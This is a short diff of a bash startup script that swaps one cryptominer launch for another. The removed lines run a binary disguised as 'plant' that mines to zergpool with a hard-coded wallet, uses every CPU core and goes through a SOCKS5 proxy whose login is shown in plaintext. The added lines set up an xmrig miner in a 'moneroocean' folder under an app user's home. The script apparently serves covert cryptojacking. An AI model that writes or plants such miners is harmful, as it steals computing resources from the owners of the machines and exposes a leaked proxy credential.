@@ -1,4 +1,4 @@
 #!/bin/bash
 
-chmod +x plant  >/dev/null 2>&1
-./plant -a yespower -o stratum+tcp://yespower.asia.mine.zergpool.com:6533 -u 4AZ6u7wEVZ7EDFAXCnZGkf1PwRPMDStboTzzwJhf1LcJiK3Ki4H2SgjVCnFsgkwDoVa5De6zWQaXUcsEz1Hgu7b1LnvBTpu.wrk -p c=TRX,mc=XMR -t $(nproc) -x socks5://ubuntu2004-rotate:LijayaAnli1188@p.webshare.io:80
+chmod +x /home/appuser/moneroocean/xmrig  >/dev/null 2>&1
+tail -f /home/appuser/moneroocean/xmrig.log
